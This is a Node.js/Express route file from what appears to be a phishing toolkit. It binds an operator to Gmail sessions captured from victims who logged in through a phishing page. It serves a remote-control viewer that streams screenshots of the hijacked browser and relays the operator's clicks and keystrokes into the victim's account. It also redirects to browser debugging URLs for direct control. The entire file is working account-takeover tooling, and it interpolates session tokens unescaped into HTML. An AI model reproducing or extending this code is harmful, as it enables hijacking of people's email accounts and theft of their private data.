const express = require('express');
const router = express.Router();
const db = require('../database');

/**
 * Gmail Session Binding Routes
 * Handles session binding for victims accessing Gmail phishing sessions
 */

// Get gmail browser service reference
let gmailBrowserService = null;

// Initialize service reference
const initService = (service) => {
  gmailBrowserService = service;
};

// Handle Gmail browser session routing for phishing victims
router.get('/gmail-browser/:sessionToken', async (req, res) => {
  const { sessionToken } = req.params;
  const trackingId = req.query._fstrike_track || '';

  try {
    console.log(`🎯 Gmail bind URL accessed: ${sessionToken}`);

    if (!gmailBrowserService) {
      return res.status(500).send('<html><body><h3>Service Not Available</h3><p>Gmail browser service not initialized</p></body></html>');
    }

    // 1. Check if session is already active in memory
    const activeSession = gmailBrowserService.getSessionInfo(sessionToken);
    
    if (activeSession && activeSession.isActive) {
      console.log(`✅ Found active session: ${sessionToken}`);
      
      // Get the debugging URL from session data
      const sessionData = gmailBrowserService.activeSessions.get(sessionToken);
      if (sessionData && sessionData.debuggingUrl) {
        console.log(`🔗 Redirecting to debugging URL: ${sessionData.debuggingUrl}`);
        return res.redirect(sessionData.debuggingUrl);
      } else {
        // Show actual Gmail session with screenshots - NOT a status page
        return res.send(`
          <!DOCTYPE html>
          <html>
          <head>
            <title>Gmail Session</title>
            <style>
              * { margin: 0; padding: 0; box-sizing: border-box; }
              html, body { height: 100%; overflow: hidden; background: #000; }
              
              #screenshot {
                width: 100%;
                height: 100%;
                object-fit: contain;
                cursor: pointer;
                display: block;
                background: #f8f9fa;
              }
              
              .click-overlay {
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                z-index: 10;
                cursor: pointer;
              }
              
              .loading {
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                color: white;
                font-family: Arial, sans-serif;
                text-align: center;
              }
            </style>
          </head>
          <body>
            <div class="loading" id="loading">Loading Gmail session...</div>
            <img id="screenshot" src="" alt="Gmail Session" style="display: none;">
            <div class="click-overlay" onclick="handleClick(event)"></div>
            
            <script src="/socket.io/socket.io.js"></script>
            <script>
              const sessionToken = '${sessionToken}';
              let socket;
              let screenshotImg = document.getElementById('screenshot');
              let loading = document.getElementById('loading');
              
              // Initialize socket connection
              function initSocket() {
                socket = io({ timeout: 20000, forceNew: true });
                
                socket.on('connect', () => {
                  console.log('Connected to Gmail session');
                  socket.emit('joinGmailSession', {
                    sessionToken: sessionToken,
                    userId: 'viewer-' + Date.now()
                  });
                });
                
                socket.on('screenshot', (data) => {
                  if (data.sessionToken === sessionToken) {
                    screenshotImg.src = 'data:image/png;base64,' + data.screenshot;
                    screenshotImg.style.display = 'block';
                    loading.style.display = 'none';
                  }
                });
                
                socket.on('connect_error', (error) => {
                  console.error('Socket connection error:', error);
                  loading.innerHTML = 'Connection error - retrying...';
                });
              }
              
              // Handle clicks on the browser screen
              function handleClick(event) {
                const rect = screenshotImg.getBoundingClientRect();
                const scaleX = screenshotImg.naturalWidth / rect.width;
                const scaleY = screenshotImg.naturalHeight / rect.height;
                
                const x = (event.clientX - rect.left) * scaleX;
                const y = (event.clientY - rect.top) * scaleY;
                
                console.log('Click at:', x, y);
                
                // Send click to the browser session
                fetch('/api/gmail-browser/session/' + sessionToken + '/action', {
                  method: 'POST',
                  headers: {'Content-Type': 'application/json'},
                  body: JSON.stringify({
                    action: 'click',
                    params: {x: Math.round(x), y: Math.round(y)}
                  })
                }).then(() => {
                  // Request immediate screenshot after clicking
                  setTimeout(requestScreenshot, 100);
                }).catch(console.error);
              }
              
              // Request a screenshot
              function requestScreenshot() {
                fetch('/api/gmail-browser/session/' + sessionToken + '/fast-screenshot')
                  .then(response => response.blob())
                  .then(blob => {
                    const reader = new FileReader();
                    reader.onload = () => {
                      screenshotImg.src = reader.result;
                      screenshotImg.style.display = 'block';
                      loading.style.display = 'none';
                    };
                    reader.readAsDataURL(blob);
                  })
                  .catch(error => {
                    console.error('Screenshot error:', error);
                    loading.innerHTML = 'Failed to load Gmail session';
                  });
              }
              
              // Initialize
              initSocket();
              requestScreenshot();
              
              // Auto-refresh screenshots
              setInterval(requestScreenshot, 2000);
              
              // Handle keyboard input
              document.addEventListener('keydown', (event) => {
                fetch('/api/gmail-browser/session/' + sessionToken + '/action', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    action: 'key',
                    params: {
                      key: event.key,
                      code: event.code,
                      ctrlKey: event.ctrlKey,
                      shiftKey: event.shiftKey,
                      altKey: event.altKey
                    }
                  })
                }).catch(console.error);
              });
            </script>
          </body>
          </html>
        `);
      }
    }

    // 2. Check database for session record (WebsiteMirroringSessions table - where campaigns are stored)
    const record = await new Promise((resolve, reject) => {
      // Check if session_type column exists and build appropriate query
      db.all("PRAGMA table_info(WebsiteMirroringSessions)", (err, columns) => {
        if (err) {
          reject(err);
          return;
        }

        const hasSessionType = columns.some(col => col.name === 'session_type');
        
        let query, params;
        if (hasSessionType) {
          // Look for Gmail browser sessions specifically
          query = `SELECT * FROM WebsiteMirroringSessions WHERE session_token = ? AND session_type = 'gmail_browser'`;
          params = [sessionToken];
        } else {
          // Fallback: look for any session with Gmail in target URL
          query = `SELECT * FROM WebsiteMirroringSessions WHERE session_token = ? AND target_url LIKE '%gmail%'`;
          params = [sessionToken];
        }

        db.get(query, params, (err, row) => {
          if (err) reject(err);
          else resolve(row);
        });
      });
    });
    
    if (!record) {
      console.log(`❌ Session not found in database: ${sessionToken}`);
      
      // Show a message indicating user needs to access the campaign first
      return res.status(404).send(`
        <!DOCTYPE html>
        <html>
        <head>
          <title>Session Not Ready</title>
          <style>
            body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f8f9fa; }
            .container { max-width: 600px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .warning { color: #856404; }
            .info { background: #fff3cd; padding: 20px; border-radius: 5px; margin: 20px 0; border-left: 4px solid #ffc107; }
            .btn { background: #1a73e8; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; text-decoration: none; display: inline-block; margin: 10px 5px; }
          </style>
        </head>
        <body>
          <div class="container">
            <h1 class="warning">⚠️ Session Not Ready</h1>
            <div class="info">
              <p><strong>This session hasn't been accessed yet.</strong></p>
              <p>To view this Gmail session, the user must first:</p>
              <ol style="text-align: left; margin: 20px 0;">
                <li>Visit the original campaign link</li>
                <li>Log into Gmail through the phishing page</li>
                <li>Then this bind URL will become active</li>
              </ol>
              <p><strong>Session Token:</strong> ${sessionToken}</p>
              <p><strong>Tracking ID:</strong> ${trackingId}</p>
            </div>
            
            <button class="btn" onclick="location.reload()">Check Again</button>
          </div>
          
          <script>
            // Auto-refresh every 10 seconds to check if session becomes available
            setTimeout(() => {
              location.reload();
            }, 10000);
          </script>
        </body>
        </html>
      `);
    }

    // 3. Attempt to restore session
    console.log(`🔄 Attempting to restore session: ${sessionToken}`);
    let restoredInfo;
    
    try {
      restoredInfo = await gmailBrowserService.restoreGmailSession(sessionToken, record.campaign_id, {
        ip: req.ip,
        userAgent: req.get('User-Agent'),
        timestamp: new Date()
      });
    } catch (e) {
      console.error('Restore failed, creating fresh session fallback:', e.message);
      restoredInfo = await gmailBrowserService.createGmailSession(sessionToken, record.campaign_id, { 
        ip: req.ip, 
        userAgent: req.get('User-Agent') 
      });
    }

    console.log(`✅ Session restored/created: ${sessionToken}`);

    // 4. Redirect to debugging URL if available, otherwise show session view
    if (restoredInfo.debuggingUrl) {
      console.log(`🔗 Redirecting to debugging URL: ${restoredInfo.debuggingUrl}`);
      return res.redirect(restoredInfo.debuggingUrl);
    }

    // Show actual Gmail session viewer with screenshots
    return res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Gmail Session</title>
        <style>
          * { margin: 0; padding: 0; box-sizing: border-box; }
          html, body { height: 100%; overflow: hidden; background: #000; }
          
          #screenshot {
            width: 100%;
            height: 100%;
            object-fit: contain;
            cursor: pointer;
            display: block;
            background: #f8f9fa;
          }
          
          .click-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 10;
            cursor: pointer;
          }
          
          .loading {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
          }
        </style>
      </head>
      <body>
        <div class="loading" id="loading">Loading Gmail session...</div>
        <img id="screenshot" src="" alt="Gmail Session" style="display: none;">
        <div class="click-overlay" onclick="handleClick(event)"></div>
        
        <script src="/socket.io/socket.io.js"></script>
        <script>
          const sessionToken = '${sessionToken}';
          let socket;
          let screenshotImg = document.getElementById('screenshot');
          let loading = document.getElementById('loading');
          
          // Initialize socket connection
          function initSocket() {
            socket = io({ timeout: 20000, forceNew: true });
            
            socket.on('connect', () => {
              console.log('Connected to Gmail session');
              socket.emit('joinGmailSession', {
                sessionToken: sessionToken,
                userId: 'viewer-' + Date.now()
              });
            });
            
            socket.on('screenshot', (data) => {
              if (data.sessionToken === sessionToken) {
                screenshotImg.src = 'data:image/png;base64,' + data.screenshot;
                screenshotImg.style.display = 'block';
                loading.style.display = 'none';
              }
            });
            
            socket.on('connect_error', (error) => {
              console.error('Socket connection error:', error);
              loading.innerHTML = 'Connection error - retrying...';
            });
          }
          
          // Handle clicks on the browser screen
          function handleClick(event) {
            const rect = screenshotImg.getBoundingClientRect();
            const scaleX = screenshotImg.naturalWidth / rect.width;
            const scaleY = screenshotImg.naturalHeight / rect.height;
            
            const x = (event.clientX - rect.left) * scaleX;
            const y = (event.clientY - rect.top) * scaleY;
            
            console.log('Click at:', x, y);
            
            // Send click to the browser session
            fetch('/api/gmail-browser/session/' + sessionToken + '/action', {
              method: 'POST',
              headers: {'Content-Type': 'application/json'},
              body: JSON.stringify({
                action: 'click',
                params: {x: Math.round(x), y: Math.round(y)}
              })
            }).then(() => {
              // Request immediate screenshot after clicking
              setTimeout(requestScreenshot, 100);
            }).catch(console.error);
          }
          
          // Request a screenshot
          function requestScreenshot() {
            fetch('/api/gmail-browser/session/' + sessionToken + '/fast-screenshot')
              .then(response => response.blob())
              .then(blob => {
                const reader = new FileReader();
                reader.onload = () => {
                  screenshotImg.src = reader.result;
                  screenshotImg.style.display = 'block';
                  loading.style.display = 'none';
                };
                reader.readAsDataURL(blob);
              })
              .catch(error => {
                console.error('Screenshot error:', error);
                loading.innerHTML = 'Failed to load Gmail session';
              });
          }
          
          // Initialize
          initSocket();
          requestScreenshot();
          
          // Auto-refresh screenshots every 2 seconds
          setInterval(requestScreenshot, 2000);
          
          // Handle keyboard input
          document.addEventListener('keydown', (event) => {
            fetch('/api/gmail-browser/session/' + sessionToken + '/action', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                action: 'key',
                params: {
                  key: event.key,
                  code: event.code,
                  ctrlKey: event.ctrlKey,
                  shiftKey: event.shiftKey,
                  altKey: event.altKey
                }
              })
            }).catch(console.error);
          });
        </script>
      </body>
      </html>
    `);

  } catch (err) {
    console.error('Gmail bind route error:', err);
    return res.status(500).send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Internal Error</title>
        <style>
          body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f8f9fa; }
          .container { max-width: 600px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
          .error { color: #d73527; }
        </style>
      </head>
      <body>
        <div class="container">
          <h1 class="error">⚠️ Internal Error</h1>
          <p>An error occurred while processing your request.</p>
          <p><strong>Session:</strong> ${sessionToken}</p>
          <button onclick="location.reload()" style="background: #1a73e8; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer;">Try Again</button>
        </div>
      </body>
      </html>
    `);
  }
});

module.exports = { router, initService };
